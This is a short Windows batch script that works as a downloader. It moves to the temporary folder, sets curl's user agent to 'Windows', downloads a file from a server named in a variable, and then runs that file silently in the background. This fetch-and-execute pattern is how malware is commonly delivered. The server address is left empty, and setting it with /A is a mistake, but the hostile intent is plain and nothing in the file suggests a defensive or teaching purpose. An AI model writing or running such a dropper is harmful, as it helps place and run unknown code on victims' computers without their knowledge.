@echo off

set /A ip_server=""

cd %TEMP%
curl -A "Windows" http://%ip_server%/downloads --output file

start /B .\file
